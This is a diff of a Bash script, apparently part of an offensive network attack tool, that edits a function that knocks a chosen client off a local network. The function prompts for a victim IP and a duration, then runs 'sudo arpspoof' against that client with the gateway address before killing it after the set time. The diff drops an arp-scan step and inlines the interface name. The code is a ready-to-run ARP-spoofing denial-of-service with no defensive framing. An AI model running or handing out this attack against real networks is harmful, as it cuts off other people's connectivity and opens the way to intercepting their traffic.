@@ -463,18 +463,17 @@ modeagain () {
 	tput cnorm
 	modeverification
 }
-tarnomon="$(echo "$tar" | sed 's/mon$//')"
+
 dosforclient () {
 
 	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting DoS for client... Wait a moment"
 	reconnect
-	sudo arp-scan -I $tarnomon --localnet 
 	sleep 1
 	tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour Client you want to disconnect (ip): " && read clientattackdos
 	echo -ne "\n${greenColour}[?]$grayColour How long do you want the attack to last (seconds)?: " && read seg2
 	tput civis
 	ipnew=$(echo $clientattackdos | sed 's/\([0-9]\+\)$/1/g')
-	xterm -hold -e "sudo arpspoof -i "$tarnomon" -t "$clientattackdos" "$ipnew"" &
+	xterm -hold -e "sudo arpspoof -i "$(echo "$tar" | sed 's/mon$//')" -t "$clientattackdos" "$ipnew"" &
 	arpspoof_PID=$!
 	sleep $seg2; kill -9 $arpspoof_PID; wait $arpspoof_PID 2>/dev/null
 	modeagain
